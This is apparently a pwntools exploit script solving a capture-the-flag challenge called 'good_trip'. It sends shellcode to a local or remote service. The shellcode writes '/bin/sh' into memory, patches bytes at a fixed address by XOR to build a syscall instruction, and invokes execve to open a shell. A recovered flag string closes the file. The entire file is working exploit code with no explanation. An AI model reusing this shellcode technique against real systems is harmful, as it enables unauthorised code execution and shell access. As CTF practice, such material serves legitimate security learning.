#!/usr/bin/python3
from pwn import *
gs = '''
continue
'''
elf = context.binary = ELF('./good_trip')
context.terminal = ['tmux', 'splitw', '-hp', '70']

def start():
    if args.GDB:
        return gdb.debug('./good_trip', gdbscript=gs)
    if args.REMOTE:
        return remote('172.210.129.230', 1351)
    else:
        return process('./good_trip')
r = start()
#========= exploit here ===================

payload = b"\x90"*0x7

payload += b"\x90" #b"\xcc"

payload += asm('''

    mov rsp, 0x404200
    mov rbp, 0x404200
    mov r11, 0x401090
    mov rsi, 0x100
    mov rdx, 0x7 
    call r11
    mov r10, 0x0068732f6e69622f
    mov [0x404100], r10
    mov rdi, 0x404100
    xor rsi, rsi
    xor rdx, rdx
    mov r9, 0x0000000000000959f
    mov r10, 0x1337131000
    xor [r10], r9
    mov rax, 0x3b
    mov rsp, 0x1337131000
    jmp rsp 
    ''')

payload += b"\xcc"*0x100

size = str(len(payload)).encode('ascii')

r.sendlineafter(b"code size >>", size)
r.sendlineafter(b"code >>", payload)


#======== interactive ====================
r.interactive()
#AKASEC{y34h_You_C4N7_PRO73C7_5om37hIn9_YoU_doN7_h4V3}
